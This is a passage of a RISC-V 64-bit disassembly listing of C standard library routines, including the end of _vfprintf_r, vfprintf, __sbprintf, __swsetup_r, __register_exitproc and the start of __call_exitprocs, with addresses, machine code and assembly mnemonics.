   11a44:	94d2                	add	s1,s1,s4
   11a46:	416484bb          	subw	s1,s1,s6
   11a4a:	418a07bb          	subw	a5,s4,s8
   11a4e:	8c3e                	mv	s8,a5
   11a50:	00f4d463          	ble	a5,s1,11a58 <_vfprintf_r+0x11b4>
   11a54:	00048c1b          	sext.w	s8,s1
   11a58:	03805b63          	blez	s8,11a8e <_vfprintf_r+0x11ea>
   11a5c:	67d2                	ld	a5,272(sp)
   11a5e:	016cb023          	sd	s6,0(s9)
   11a62:	018cb423          	sd	s8,8(s9)
   11a66:	97e2                	add	a5,a5,s8
   11a68:	ea3e                	sd	a5,272(sp)
   11a6a:	10812783          	lw	a5,264(sp)
   11a6e:	0cc1                	addi	s9,s9,16
   11a70:	0017871b          	addiw	a4,a5,1
   11a74:	10e12423          	sw	a4,264(sp)
   11a78:	479d                	li	a5,7
   11a7a:	00e7da63          	ble	a4,a5,11a8e <_vfprintf_r+0x11ea>
   11a7e:	0210                	addi	a2,sp,256
   11a80:	85ca                	mv	a1,s2
   11a82:	854e                	mv	a0,s3
   11a84:	594050ef          	jal	ra,17018 <__sprint_r>
   11a88:	36051f63          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11a8c:	8cd6                	mv	s9,s5
   11a8e:	87e2                	mv	a5,s8
   11a90:	000c5363          	bgez	s8,11a96 <_vfprintf_r+0x11f2>
   11a94:	4781                	li	a5,0
   11a96:	44ee                	lw	s1,216(sp)
   11a98:	409a04bb          	subw	s1,s4,s1
   11a9c:	9c9d                	subw	s1,s1,a5
   11a9e:	d0905ee3          	blez	s1,117ba <_vfprintf_r+0xf16>
   11aa2:	6b69                	lui	s6,0x1a
   11aa4:	4c41                	li	s8,16
   11aa6:	230b0b13          	addi	s6,s6,560 # 1a230 <zeroes.4441>
   11aaa:	4d1d                	li	s10,7
   11aac:	10812703          	lw	a4,264(sp)
   11ab0:	016cb023          	sd	s6,0(s9)
   11ab4:	67d2                	ld	a5,272(sp)
   11ab6:	0017069b          	addiw	a3,a4,1
   11aba:	8736                	mv	a4,a3
   11abc:	010c8613          	addi	a2,s9,16
   11ac0:	169c4f63          	blt	s8,s1,11c3e <_vfprintf_r+0x139a>
   11ac4:	009cb423          	sd	s1,8(s9)
   11ac8:	94be                	add	s1,s1,a5
   11aca:	ea26                	sd	s1,272(sp)
   11acc:	10d12423          	sw	a3,264(sp)
   11ad0:	479d                	li	a5,7
   11ad2:	8cb2                	mv	s9,a2
   11ad4:	ced7d3e3          	ble	a3,a5,117ba <_vfprintf_r+0xf16>
   11ad8:	0210                	addi	a2,sp,256
   11ada:	85ca                	mv	a1,s2
   11adc:	854e                	mv	a0,s3
   11ade:	53a050ef          	jal	ra,17018 <__sprint_r>
   11ae2:	32051263          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11ae6:	18010c93          	addi	s9,sp,384
   11aea:	b9c1                	j	117ba <_vfprintf_r+0xf16>
   11aec:	0741                	addi	a4,a4,16
   11aee:	010cb423          	sd	a6,8(s9)
   11af2:	ea3a                	sd	a4,272(sp)
   11af4:	10c12423          	sw	a2,264(sp)
   11af8:	00b8de63          	ble	a1,a7,11b14 <_vfprintf_r+0x1270>
   11afc:	0210                	addi	a2,sp,256
   11afe:	85ca                	mv	a1,s2
   11b00:	854e                	mv	a0,s3
   11b02:	f8c6                	sd	a7,112(sp)
   11b04:	f4c2                	sd	a6,104(sp)
   11b06:	512050ef          	jal	ra,17018 <__sprint_r>
   11b0a:	2e051e63          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11b0e:	78c6                	ld	a7,112(sp)
   11b10:	7826                	ld	a6,104(sp)
   11b12:	8556                	mv	a0,s5
   11b14:	3b41                	addiw	s6,s6,-16
   11b16:	8caa                	mv	s9,a0
   11b18:	bdb5                	j	11994 <_vfprintf_r+0x10f0>
   11b1a:	c7d5                	beqz	a5,11bc6 <_vfprintf_r+0x1322>
   11b1c:	47a2                	lw	a5,8(sp)
   11b1e:	37fd                	addiw	a5,a5,-1
   11b20:	e43e                	sd	a5,8(sp)
   11b22:	67c6                	ld	a5,80(sp)
   11b24:	6706                	ld	a4,64(sp)
   11b26:	0cc1                	addi	s9,s9,16
   11b28:	fefcb823          	sd	a5,-16(s9)
   11b2c:	6786                	ld	a5,64(sp)
   11b2e:	fefcbc23          	sd	a5,-8(s9)
   11b32:	67d2                	ld	a5,272(sp)
   11b34:	97ba                	add	a5,a5,a4
   11b36:	ea3e                	sd	a5,272(sp)
   11b38:	10812783          	lw	a5,264(sp)
   11b3c:	0017871b          	addiw	a4,a5,1
   11b40:	10e12423          	sw	a4,264(sp)
   11b44:	00edda63          	ble	a4,s11,11b58 <_vfprintf_r+0x12b4>
   11b48:	0210                	addi	a2,sp,256
   11b4a:	85ca                	mv	a1,s2
   11b4c:	854e                	mv	a0,s3
   11b4e:	4ca050ef          	jal	ra,17018 <__sprint_r>
   11b52:	2a051a63          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11b56:	8cd6                	mv	s9,s5
   11b58:	6702                	ld	a4,0(sp)
   11b5a:	57a6                	lw	a5,104(sp)
   11b5c:	00074703          	lbu	a4,0(a4)
   11b60:	416787bb          	subw	a5,a5,s6
   11b64:	00e7d463          	ble	a4,a5,11b6c <_vfprintf_r+0x12c8>
   11b68:	0007871b          	sext.w	a4,a5
   11b6c:	02e05d63          	blez	a4,11ba6 <_vfprintf_r+0x1302>
   11b70:	67d2                	ld	a5,272(sp)
   11b72:	016cb023          	sd	s6,0(s9)
   11b76:	00ecb423          	sd	a4,8(s9)
   11b7a:	97ba                	add	a5,a5,a4
   11b7c:	ea3e                	sd	a5,272(sp)
   11b7e:	10812783          	lw	a5,264(sp)
   11b82:	0cc1                	addi	s9,s9,16
   11b84:	0017869b          	addiw	a3,a5,1
   11b88:	10d12423          	sw	a3,264(sp)
   11b8c:	00dddd63          	ble	a3,s11,11ba6 <_vfprintf_r+0x1302>
   11b90:	0210                	addi	a2,sp,256
   11b92:	85ca                	mv	a1,s2
   11b94:	854e                	mv	a0,s3
   11b96:	f8ba                	sd	a4,112(sp)
   11b98:	480050ef          	jal	ra,17018 <__sprint_r>
   11b9c:	26051563          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11ba0:	7746                	ld	a4,112(sp)
   11ba2:	18010c93          	addi	s9,sp,384
   11ba6:	86ba                	mv	a3,a4
   11ba8:	00075363          	bgez	a4,11bae <_vfprintf_r+0x130a>
   11bac:	4681                	li	a3,0
   11bae:	6782                	ld	a5,0(sp)
   11bb0:	4841                	li	a6,16
   11bb2:	0007c783          	lbu	a5,0(a5)
   11bb6:	9f95                	subw	a5,a5,a3
   11bb8:	04f04463          	bgtz	a5,11c00 <_vfprintf_r+0x135c>
   11bbc:	6782                	ld	a5,0(sp)
   11bbe:	0007c783          	lbu	a5,0(a5)
   11bc2:	9b3e                	add	s6,s6,a5
   11bc4:	b51d                	j	119ea <_vfprintf_r+0x1146>
   11bc6:	6782                	ld	a5,0(sp)
   11bc8:	3c7d                	addiw	s8,s8,-1
   11bca:	17fd                	addi	a5,a5,-1
   11bcc:	e03e                	sd	a5,0(sp)
   11bce:	bf91                	j	11b22 <_vfprintf_r+0x127e>
   11bd0:	0741                	addi	a4,a4,16
   11bd2:	01acb023          	sd	s10,0(s9)
   11bd6:	010cb423          	sd	a6,8(s9)
   11bda:	ea3a                	sd	a4,272(sp)
   11bdc:	10d12423          	sw	a3,264(sp)
   11be0:	00cdde63          	ble	a2,s11,11bfc <_vfprintf_r+0x1358>
   11be4:	0210                	addi	a2,sp,256
   11be6:	85ca                	mv	a1,s2
   11be8:	854e                	mv	a0,s3
   11bea:	fcc2                	sd	a6,120(sp)
   11bec:	f8be                	sd	a5,112(sp)
   11bee:	42a050ef          	jal	ra,17018 <__sprint_r>
   11bf2:	20051a63          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11bf6:	7866                	ld	a6,120(sp)
   11bf8:	77c6                	ld	a5,112(sp)
   11bfa:	030c                	addi	a1,sp,384
   11bfc:	37c1                	addiw	a5,a5,-16
   11bfe:	8cae                	mv	s9,a1
   11c00:	10812683          	lw	a3,264(sp)
   11c04:	6752                	ld	a4,272(sp)
   11c06:	010c8593          	addi	a1,s9,16
   11c0a:	0016861b          	addiw	a2,a3,1
   11c0e:	86b2                	mv	a3,a2
   11c10:	fcf840e3          	blt	a6,a5,11bd0 <_vfprintf_r+0x132c>
   11c14:	00fcb423          	sd	a5,8(s9)
   11c18:	97ba                	add	a5,a5,a4
   11c1a:	01acb023          	sd	s10,0(s9)
   11c1e:	ea3e                	sd	a5,272(sp)
   11c20:	10c12423          	sw	a2,264(sp)
   11c24:	8cae                	mv	s9,a1
   11c26:	f8cddbe3          	ble	a2,s11,11bbc <_vfprintf_r+0x1318>
   11c2a:	0210                	addi	a2,sp,256
   11c2c:	85ca                	mv	a1,s2
   11c2e:	854e                	mv	a0,s3
   11c30:	3e8050ef          	jal	ra,17018 <__sprint_r>
   11c34:	1c051963          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11c38:	18010c93          	addi	s9,sp,384
   11c3c:	b741                	j	11bbc <_vfprintf_r+0x1318>
   11c3e:	07c1                	addi	a5,a5,16
   11c40:	018cb423          	sd	s8,8(s9)
   11c44:	ea3e                	sd	a5,272(sp)
   11c46:	10e12423          	sw	a4,264(sp)
   11c4a:	00dd5a63          	ble	a3,s10,11c5e <_vfprintf_r+0x13ba>
   11c4e:	0210                	addi	a2,sp,256
   11c50:	85ca                	mv	a1,s2
   11c52:	854e                	mv	a0,s3
   11c54:	3c4050ef          	jal	ra,17018 <__sprint_r>
   11c58:	1a051763          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11c5c:	0310                	addi	a2,sp,384
   11c5e:	34c1                	addiw	s1,s1,-16
   11c60:	8cb2                	mv	s9,a2
   11c62:	b5a9                	j	11aac <_vfprintf_r+0x1208>
   11c64:	10812783          	lw	a5,264(sp)
   11c68:	4605                	li	a2,1
   11c6a:	009cb023          	sd	s1,0(s9)
   11c6e:	0017869b          	addiw	a3,a5,1
   11c72:	0705                	addi	a4,a4,1
   11c74:	87b6                	mv	a5,a3
   11c76:	010c8c13          	addi	s8,s9,16
   11c7a:	01464663          	blt	a2,s4,11c86 <_vfprintf_r+0x13e2>
   11c7e:	00147593          	andi	a1,s0,1
   11c82:	12058663          	beqz	a1,11dae <_vfprintf_r+0x150a>
   11c86:	4605                	li	a2,1
   11c88:	10f12423          	sw	a5,264(sp)
   11c8c:	00ccb423          	sd	a2,8(s9)
   11c90:	ea3a                	sd	a4,272(sp)
   11c92:	479d                	li	a5,7
   11c94:	00d7da63          	ble	a3,a5,11ca8 <_vfprintf_r+0x1404>
   11c98:	0210                	addi	a2,sp,256
   11c9a:	85ca                	mv	a1,s2
   11c9c:	854e                	mv	a0,s3
   11c9e:	37a050ef          	jal	ra,17018 <__sprint_r>
   11ca2:	16051263          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11ca6:	8c56                	mv	s8,s5
   11ca8:	67a6                	ld	a5,72(sp)
   11caa:	6762                	ld	a4,24(sp)
   11cac:	0c41                	addi	s8,s8,16
   11cae:	fefc3823          	sd	a5,-16(s8)
   11cb2:	67e2                	ld	a5,24(sp)
   11cb4:	fefc3c23          	sd	a5,-8(s8)
   11cb8:	67d2                	ld	a5,272(sp)
   11cba:	97ba                	add	a5,a5,a4
   11cbc:	ea3e                	sd	a5,272(sp)
   11cbe:	10812783          	lw	a5,264(sp)
   11cc2:	0017871b          	addiw	a4,a5,1
   11cc6:	10e12423          	sw	a4,264(sp)
   11cca:	479d                	li	a5,7
   11ccc:	00e7da63          	ble	a4,a5,11ce0 <_vfprintf_r+0x143c>
   11cd0:	0210                	addi	a2,sp,256
   11cd2:	85ca                	mv	a1,s2
   11cd4:	854e                	mv	a0,s3
   11cd6:	342050ef          	jal	ra,17018 <__sprint_r>
   11cda:	12051663          	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11cde:	8c56                	mv	s8,s5
   11ce0:	754e                	ld	a0,240(sp)
   11ce2:	75ee                	ld	a1,248(sp)
   11ce4:	4601                	li	a2,0
   11ce6:	4681                	li	a3,0
   11ce8:	fffa0b1b          	addiw	s6,s4,-1
   11cec:	5d3060ef          	jal	ra,18abe <__eqtf2>
   11cf0:	c12d                	beqz	a0,11d52 <_vfprintf_r+0x14ae>
   11cf2:	10812703          	lw	a4,264(sp)
   11cf6:	67d2                	ld	a5,272(sp)
   11cf8:	0485                	addi	s1,s1,1
   11cfa:	0017069b          	addiw	a3,a4,1
   11cfe:	97da                	add	a5,a5,s6
   11d00:	009c3023          	sd	s1,0(s8)
   11d04:	016c3423          	sd	s6,8(s8)
   11d08:	ea3e                	sd	a5,272(sp)
   11d0a:	10d12423          	sw	a3,264(sp)
   11d0e:	479d                	li	a5,7
   11d10:	0c41                	addi	s8,s8,16
   11d12:	00d7d963          	ble	a3,a5,11d24 <_vfprintf_r+0x1480>
   11d16:	0210                	addi	a2,sp,256
   11d18:	85ca                	mv	a1,s2
   11d1a:	854e                	mv	a0,s3
   11d1c:	2fc050ef          	jal	ra,17018 <__sprint_r>
   11d20:	e17d                	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11d22:	8c56                	mv	s8,s5
   11d24:	119c                	addi	a5,sp,224
   11d26:	00fc3023          	sd	a5,0(s8)
   11d2a:	67e6                	ld	a5,88(sp)
   11d2c:	6766                	ld	a4,88(sp)
   11d2e:	010c0c93          	addi	s9,s8,16
   11d32:	00fc3423          	sd	a5,8(s8)
   11d36:	67d2                	ld	a5,272(sp)
   11d38:	97ba                	add	a5,a5,a4
   11d3a:	ea3e                	sd	a5,272(sp)
   11d3c:	10812783          	lw	a5,264(sp)
   11d40:	0017871b          	addiw	a4,a5,1
   11d44:	10e12423          	sw	a4,264(sp)
   11d48:	479d                	li	a5,7
   11d4a:	a6e7d8e3          	ble	a4,a5,117ba <_vfprintf_r+0xf16>
   11d4e:	8a8ff06f          	j	10df6 <_vfprintf_r+0x552>
   11d52:	fd6059e3          	blez	s6,11d24 <_vfprintf_r+0x1480>
   11d56:	64e9                	lui	s1,0x1a
   11d58:	4d41                	li	s10,16
   11d5a:	23048493          	addi	s1,s1,560 # 1a230 <zeroes.4441>
   11d5e:	4c9d                	li	s9,7
   11d60:	10812703          	lw	a4,264(sp)
   11d64:	009c3023          	sd	s1,0(s8)
   11d68:	67d2                	ld	a5,272(sp)
   11d6a:	0017069b          	addiw	a3,a4,1
   11d6e:	8736                	mv	a4,a3
   11d70:	010c0613          	addi	a2,s8,16
   11d74:	016d4b63          	blt	s10,s6,11d8a <_vfprintf_r+0x14e6>
   11d78:	97da                	add	a5,a5,s6
   11d7a:	016c3423          	sd	s6,8(s8)
   11d7e:	ea3e                	sd	a5,272(sp)
   11d80:	10d12423          	sw	a3,264(sp)
   11d84:	479d                	li	a5,7
   11d86:	8c32                	mv	s8,a2
   11d88:	b769                	j	11d12 <_vfprintf_r+0x146e>
   11d8a:	07c1                	addi	a5,a5,16
   11d8c:	01ac3423          	sd	s10,8(s8)
   11d90:	ea3e                	sd	a5,272(sp)
   11d92:	10e12423          	sw	a4,264(sp)
   11d96:	00dcd963          	ble	a3,s9,11da8 <_vfprintf_r+0x1504>
   11d9a:	0210                	addi	a2,sp,256
   11d9c:	85ca                	mv	a1,s2
   11d9e:	854e                	mv	a0,s3
   11da0:	278050ef          	jal	ra,17018 <__sprint_r>
   11da4:	e12d                	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11da6:	8656                	mv	a2,s5
   11da8:	3b41                	addiw	s6,s6,-16
   11daa:	8c32                	mv	s8,a2
   11dac:	bf55                	j	11d60 <_vfprintf_r+0x14bc>
   11dae:	00ccb423          	sd	a2,8(s9)
   11db2:	ea3a                	sd	a4,272(sp)
   11db4:	10d12423          	sw	a3,264(sp)
   11db8:	479d                	li	a5,7
   11dba:	bfa1                	j	11d12 <_vfprintf_r+0x146e>
   11dbc:	5782                	lw	a5,32(sp)
   11dbe:	5762                	lw	a4,56(sp)
   11dc0:	40e7843b          	subw	s0,a5,a4
   11dc4:	9e805ee3          	blez	s0,117c0 <_vfprintf_r+0xf1c>
   11dc8:	64e9                	lui	s1,0x1a
   11dca:	4b41                	li	s6,16
   11dcc:	22048493          	addi	s1,s1,544 # 1a220 <blanks.4440>
   11dd0:	4c1d                	li	s8,7
   11dd2:	10812703          	lw	a4,264(sp)
   11dd6:	009cb023          	sd	s1,0(s9)
   11dda:	67d2                	ld	a5,272(sp)
   11ddc:	0017069b          	addiw	a3,a4,1
   11de0:	8736                	mv	a4,a3
   11de2:	028b4a63          	blt	s6,s0,11e16 <_vfprintf_r+0x1572>
   11de6:	008cb423          	sd	s0,8(s9)
   11dea:	943e                	add	s0,s0,a5
   11dec:	ea22                	sd	s0,272(sp)
   11dee:	10d12423          	sw	a3,264(sp)
   11df2:	479d                	li	a5,7
   11df4:	9cd7d6e3          	ble	a3,a5,117c0 <_vfprintf_r+0xf1c>
   11df8:	0210                	addi	a2,sp,256
   11dfa:	85ca                	mv	a1,s2
   11dfc:	854e                	mv	a0,s3
   11dfe:	21a050ef          	jal	ra,17018 <__sprint_r>
   11e02:	9a050fe3          	beqz	a0,117c0 <_vfprintf_r+0xf1c>
   11e06:	960b8663          	beqz	s7,10f72 <_vfprintf_r+0x6ce>
   11e0a:	85de                	mv	a1,s7
   11e0c:	854e                	mv	a0,s3
   11e0e:	71c000ef          	jal	ra,1252a <_free_r>
   11e12:	960ff06f          	j	10f72 <_vfprintf_r+0x6ce>
   11e16:	07c1                	addi	a5,a5,16
   11e18:	016cb423          	sd	s6,8(s9)
   11e1c:	ea3e                	sd	a5,272(sp)
   11e1e:	10e12423          	sw	a4,264(sp)
   11e22:	0cc1                	addi	s9,s9,16
   11e24:	00dc5963          	ble	a3,s8,11e36 <_vfprintf_r+0x1592>
   11e28:	0210                	addi	a2,sp,256
   11e2a:	85ca                	mv	a1,s2
   11e2c:	854e                	mv	a0,s3
   11e2e:	1ea050ef          	jal	ra,17018 <__sprint_r>
   11e32:	f971                	bnez	a0,11e06 <_vfprintf_r+0x1562>
   11e34:	8cd6                	mv	s9,s5
   11e36:	3441                	addiw	s0,s0,-16
   11e38:	bf69                	j	11dd2 <_vfprintf_r+0x152e>
   11e3a:	85de                	mv	a1,s7
   11e3c:	854e                	mv	a0,s3
   11e3e:	6ec000ef          	jal	ra,1252a <_free_r>
   11e42:	b26d                	j	117ec <_vfprintf_r+0xf48>
   11e44:	67d2                	ld	a5,272(sp)
   11e46:	92078663          	beqz	a5,10f72 <_vfprintf_r+0x6ce>
   11e4a:	0210                	addi	a2,sp,256
   11e4c:	85ca                	mv	a1,s2
   11e4e:	854e                	mv	a0,s3
   11e50:	1c8050ef          	jal	ra,17018 <__sprint_r>
   11e54:	91eff06f          	j	10f72 <_vfprintf_r+0x6ce>

0000000000011e58 <vfprintf>:
   11e58:	86b2                	mv	a3,a2
   11e5a:	862e                	mv	a2,a1
   11e5c:	85aa                	mv	a1,a0
   11e5e:	8401b503          	ld	a0,-1984(gp) # 1c1f8 <_impure_ptr>
   11e62:	a43fe06f          	j	108a4 <_vfprintf_r>

0000000000011e66 <__sbprintf>:
   11e66:	0105d783          	lhu	a5,16(a1)
   11e6a:	b3010113          	addi	sp,sp,-1232
   11e6e:	4c813023          	sd	s0,1216(sp)
   11e72:	9bf5                	andi	a5,a5,-3
   11e74:	00f11823          	sh	a5,16(sp)
   11e78:	0ac5a783          	lw	a5,172(a1)
   11e7c:	842e                	mv	s0,a1
   11e7e:	4a913c23          	sd	s1,1208(sp)
   11e82:	d73e                	sw	a5,172(sp)
   11e84:	0125d783          	lhu	a5,18(a1)
   11e88:	4b213823          	sd	s2,1200(sp)
   11e8c:	4c113423          	sd	ra,1224(sp)
   11e90:	00f11923          	sh	a5,18(sp)
   11e94:	799c                	ld	a5,48(a1)
   11e96:	892a                	mv	s2,a0
   11e98:	d402                	sw	zero,40(sp)
   11e9a:	f83e                	sd	a5,48(sp)
   11e9c:	61bc                	ld	a5,64(a1)
   11e9e:	858a                	mv	a1,sp
   11ea0:	e0be                	sd	a5,64(sp)
   11ea2:	191c                	addi	a5,sp,176
   11ea4:	e03e                	sd	a5,0(sp)
   11ea6:	ec3e                	sd	a5,24(sp)
   11ea8:	40000793          	li	a5,1024
   11eac:	c63e                	sw	a5,12(sp)
   11eae:	d03e                	sw	a5,32(sp)
   11eb0:	9f5fe0ef          	jal	ra,108a4 <_vfprintf_r>
   11eb4:	84aa                	mv	s1,a0
   11eb6:	00054863          	bltz	a0,11ec6 <__sbprintf+0x60>
   11eba:	858a                	mv	a1,sp
   11ebc:	854a                	mv	a0,s2
   11ebe:	384000ef          	jal	ra,12242 <_fflush_r>
   11ec2:	c111                	beqz	a0,11ec6 <__sbprintf+0x60>
   11ec4:	54fd                	li	s1,-1
   11ec6:	01015783          	lhu	a5,16(sp)
   11eca:	0407f793          	andi	a5,a5,64
   11ece:	c799                	beqz	a5,11edc <__sbprintf+0x76>
   11ed0:	01045783          	lhu	a5,16(s0)
   11ed4:	0407e793          	ori	a5,a5,64
   11ed8:	00f41823          	sh	a5,16(s0)
   11edc:	4c813083          	ld	ra,1224(sp)
   11ee0:	4c013403          	ld	s0,1216(sp)
   11ee4:	8526                	mv	a0,s1
   11ee6:	4b013903          	ld	s2,1200(sp)
   11eea:	4b813483          	ld	s1,1208(sp)
   11eee:	4d010113          	addi	sp,sp,1232
   11ef2:	8082                	ret

0000000000011ef4 <__swsetup_r>:
   11ef4:	1101                	addi	sp,sp,-32
   11ef6:	e426                	sd	s1,8(sp)
   11ef8:	84aa                	mv	s1,a0
   11efa:	8401b503          	ld	a0,-1984(gp) # 1c1f8 <_impure_ptr>
   11efe:	e822                	sd	s0,16(sp)
   11f00:	ec06                	sd	ra,24(sp)
   11f02:	842e                	mv	s0,a1
   11f04:	c509                	beqz	a0,11f0e <__swsetup_r+0x1a>
   11f06:	493c                	lw	a5,80(a0)
   11f08:	e399                	bnez	a5,11f0e <__swsetup_r+0x1a>
   11f0a:	450000ef          	jal	ra,1235a <__sinit>
   11f0e:	01041703          	lh	a4,16(s0)
   11f12:	03071793          	slli	a5,a4,0x30
   11f16:	93c1                	srli	a5,a5,0x30
   11f18:	0087f693          	andi	a3,a5,8
   11f1c:	eea9                	bnez	a3,11f76 <__swsetup_r+0x82>
   11f1e:	0107f693          	andi	a3,a5,16
   11f22:	ee89                	bnez	a3,11f3c <__swsetup_r+0x48>
   11f24:	47a5                	li	a5,9
   11f26:	c09c                	sw	a5,0(s1)
   11f28:	04076713          	ori	a4,a4,64
   11f2c:	00e41823          	sh	a4,16(s0)
   11f30:	557d                	li	a0,-1
   11f32:	60e2                	ld	ra,24(sp)
   11f34:	6442                	ld	s0,16(sp)
   11f36:	64a2                	ld	s1,8(sp)
   11f38:	6105                	addi	sp,sp,32
   11f3a:	8082                	ret
   11f3c:	8b91                	andi	a5,a5,4
   11f3e:	c795                	beqz	a5,11f6a <__swsetup_r+0x76>
   11f40:	6c2c                	ld	a1,88(s0)
   11f42:	c991                	beqz	a1,11f56 <__swsetup_r+0x62>
   11f44:	07440793          	addi	a5,s0,116
   11f48:	00f58563          	beq	a1,a5,11f52 <__swsetup_r+0x5e>
   11f4c:	8526                	mv	a0,s1
   11f4e:	5dc000ef          	jal	ra,1252a <_free_r>
   11f52:	04043c23          	sd	zero,88(s0)
   11f56:	01045783          	lhu	a5,16(s0)
   11f5a:	00042423          	sw	zero,8(s0)
   11f5e:	fdb7f793          	andi	a5,a5,-37
   11f62:	00f41823          	sh	a5,16(s0)
   11f66:	6c1c                	ld	a5,24(s0)
   11f68:	e01c                	sd	a5,0(s0)
   11f6a:	01045783          	lhu	a5,16(s0)
   11f6e:	0087e793          	ori	a5,a5,8
   11f72:	00f41823          	sh	a5,16(s0)
   11f76:	6c1c                	ld	a5,24(s0)
   11f78:	ef89                	bnez	a5,11f92 <__swsetup_r+0x9e>
   11f7a:	01045783          	lhu	a5,16(s0)
   11f7e:	20000713          	li	a4,512
   11f82:	2807f793          	andi	a5,a5,640
   11f86:	00e78663          	beq	a5,a4,11f92 <__swsetup_r+0x9e>
   11f8a:	85a2                	mv	a1,s0
   11f8c:	8526                	mv	a0,s1
   11f8e:	328020ef          	jal	ra,142b6 <__smakebuf_r>
   11f92:	01045783          	lhu	a5,16(s0)
   11f96:	0017f713          	andi	a4,a5,1
   11f9a:	c705                	beqz	a4,11fc2 <__swsetup_r+0xce>
   11f9c:	501c                	lw	a5,32(s0)
   11f9e:	00042623          	sw	zero,12(s0)
   11fa2:	40f007bb          	negw	a5,a5
   11fa6:	d41c                	sw	a5,40(s0)
   11fa8:	6c1c                	ld	a5,24(s0)
   11faa:	4501                	li	a0,0
   11fac:	f3d9                	bnez	a5,11f32 <__swsetup_r+0x3e>
   11fae:	01041783          	lh	a5,16(s0)
   11fb2:	0807f713          	andi	a4,a5,128
   11fb6:	df35                	beqz	a4,11f32 <__swsetup_r+0x3e>
   11fb8:	0407e793          	ori	a5,a5,64
   11fbc:	00f41823          	sh	a5,16(s0)
   11fc0:	bf85                	j	11f30 <__swsetup_r+0x3c>
   11fc2:	8b89                	andi	a5,a5,2
   11fc4:	4701                	li	a4,0
   11fc6:	e391                	bnez	a5,11fca <__swsetup_r+0xd6>
   11fc8:	5018                	lw	a4,32(s0)
   11fca:	c458                	sw	a4,12(s0)
   11fcc:	bff1                	j	11fa8 <__swsetup_r+0xb4>

0000000000011fce <__register_exitproc>:
   11fce:	8381b703          	ld	a4,-1992(gp) # 1c1f0 <_global_impure_ptr>
   11fd2:	832a                	mv	t1,a0
   11fd4:	1f873783          	ld	a5,504(a4)
   11fd8:	e789                	bnez	a5,11fe2 <__register_exitproc+0x14>
   11fda:	20070793          	addi	a5,a4,512
   11fde:	1ef73c23          	sd	a5,504(a4)
   11fe2:	4798                	lw	a4,8(a5)
   11fe4:	487d                	li	a6,31
   11fe6:	557d                	li	a0,-1
   11fe8:	04e84463          	blt	a6,a4,12030 <__register_exitproc+0x62>
   11fec:	02030a63          	beqz	t1,12020 <__register_exitproc+0x52>
   11ff0:	00371813          	slli	a6,a4,0x3
   11ff4:	983e                	add	a6,a6,a5
   11ff6:	10c83823          	sd	a2,272(a6)
   11ffa:	3107a883          	lw	a7,784(a5)
   11ffe:	4605                	li	a2,1
   12000:	00e6163b          	sllw	a2,a2,a4
   12004:	00c8e8b3          	or	a7,a7,a2
   12008:	3117a823          	sw	a7,784(a5)
   1200c:	20d83823          	sd	a3,528(a6)
   12010:	4689                	li	a3,2
   12012:	00d31763          	bne	t1,a3,12020 <__register_exitproc+0x52>
   12016:	3147a683          	lw	a3,788(a5)
   1201a:	8e55                	or	a2,a2,a3
   1201c:	30c7aa23          	sw	a2,788(a5)
   12020:	0017069b          	addiw	a3,a4,1
   12024:	0709                	addi	a4,a4,2
   12026:	070e                	slli	a4,a4,0x3
   12028:	c794                	sw	a3,8(a5)
   1202a:	97ba                	add	a5,a5,a4
   1202c:	e38c                	sd	a1,0(a5)
   1202e:	4501                	li	a0,0
   12030:	8082                	ret

0000000000012032 <__call_exitprocs>:
   12032:	715d                	addi	sp,sp,-80
   12034:	f44e                	sd	s3,40(sp)
   12036:	8381b983          	ld	s3,-1992(gp) # 1c1f0 <_global_impure_ptr>
   1203a:	f052                	sd	s4,32(sp)
   1203c:	ec56                	sd	s5,24(sp)
   1203e:	e85a                	sd	s6,16(sp)
   12040:	e486                	sd	ra,72(sp)
   12042:	e0a2                	sd	s0,64(sp)
   12044:	fc26                	sd	s1,56(sp)
   12046:	f84a                	sd	s2,48(sp)
   12048:	e45e                	sd	s7,8(sp)
   1204a:	8aaa                	mv	s5,a0
   1204c:	8a2e                	mv	s4,a1
   1204e:	4b05                	li	s6,1
   12050:	1f89b403          	ld	s0,504(s3)
   12054:	c801                	beqz	s0,12064 <__call_exitprocs+0x32>
   12056:	4404                	lw	s1,8(s0)
   12058:	34fd                	addiw	s1,s1,-1
   1205a:	00349913          	slli	s2,s1,0x3
   1205e:	9922                	add	s2,s2,s0
   12060:	0004dd63          	bgez	s1,1207a <__call_exitprocs+0x48>
   12064:	60a6                	ld	ra,72(sp)
   12066:	6406                	ld	s0,64(sp)
   12068:	74e2                	ld	s1,56(sp)
   1206a:	7942                	ld	s2,48(sp)
   1206c:	79a2                	ld	s3,40(sp)
   1206e:	7a02                	ld	s4,32(sp)
   12070:	6ae2                	ld	s5,24(sp)
   12072:	6b42                	ld	s6,16(sp)
   12074:	6ba2                	ld	s7,8(sp)
   12076:	6161                	addi	sp,sp,80
   12078:	8082                	ret
   1207a:	000a0963          	beqz	s4,1208c <__call_exitprocs+0x5a>
   1207e:	21093783          	ld	a5,528(s2)
   12082:	01478563          	beq	a5,s4,1208c <__call_exitprocs+0x5a>
   12086:	34fd                	addiw	s1,s1,-1
   12088:	1961                	addi	s2,s2,-8
   1208a:	bfd9                	j	12060 <__call_exitprocs+0x2e>
   1208c:	441c                	lw	a5,8(s0)
   1208e:	01093683          	ld	a3,16(s2)
   12092:	37fd                	addiw	a5,a5,-1
   12094:	02979663          	bne	a5,s1,120c0 <__call_exitprocs+0x8e>
   12098:	c404                	sw	s1,8(s0)
   1209a:	d6f5                	beqz	a3,12086 <__call_exitprocs+0x54>
   1209c:	31042703          	lw	a4,784(s0)
   120a0:	009b163b          	sllw	a2,s6,s1
   120a4:	00842b83          	lw	s7,8(s0)
   120a8:	8f71                	and	a4,a4,a2
   120aa:	2701                	sext.w	a4,a4
   120ac:	ef09                	bnez	a4,120c6 <__call_exitprocs+0x94>
   120ae:	9682                	jalr	a3
   120b0:	4418                	lw	a4,8(s0)
   120b2:	1f89b783          	ld	a5,504(s3)
